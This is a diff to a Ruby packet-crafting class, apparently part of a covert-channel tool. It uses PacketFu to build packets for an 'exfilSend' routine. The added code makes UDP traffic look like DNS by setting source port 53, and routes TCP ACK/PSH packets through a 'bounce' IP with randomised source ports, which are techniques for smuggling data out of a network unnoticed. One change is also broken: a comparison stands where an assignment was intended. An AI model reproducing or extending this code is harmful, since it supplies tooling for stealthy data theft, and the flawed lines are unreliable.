@@ -33,6 +33,13 @@ class Connector
     @server = server
     @port = port
     @id = 32452
+    if server == "server"
+       if @connection == tcp
+         $destMac = PacketFu::Utils.arp($tcpBounceIp, :iface => @iface)
+       else
+         $destMac = PacketFu::Utils.arp(@addr, :iface => @iface)
+       end
+    end
   end
 
   def exfilSend(payload)
@@ -142,7 +149,7 @@ class Connector
 
   private
   def cliPacketize(saddr)
-    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 53, :udp_dst => $cliPass)
+    udp_pkt = UDPPacket.new(:config => $config, :udp_src => 53, :udp_dst => @port)
     udp_pkt.eth_daddr = $destMac
     udp_pkt.ip_daddr = $ipDest
     puts saddr
@@ -156,14 +163,16 @@ class Connector
   end
 
   def tcpSend(payload)
-
+    if payload == "\n"
+      payload == "M S"
+    end
     tcp_pkt = TCPPacket.new(:config => $config)
-    tcp_pkt.tcp_flags = TcpFlags.new(:syn => 1)
+    tcp_pkt.eth_daddr = $destMac
+    tcp_pkt.tcp_flags = TcpFlags.new(:ack => 1, :psh => 1)
     tcp_pkt.tcp_dst = @port
-    tcp_pkt.ip_header.ip_id = @id
-    tcp_pkt.tcp_src = rand(57000) + 8000
-    tcp_pkt.ip_saddr = $addrPass
-    tcp_pkt.ip_daddr = @addr
+    tcp_pkt.tcp_src = rand(7999) + 1
+    tcp_pkt.ip_saddr = $addr
+    tcp_pkt.ip_daddr = @tcpBounceIp
     tcp_pkt.payload = payload
     puts "printing server payload"
     puts tcp_pkt.payload
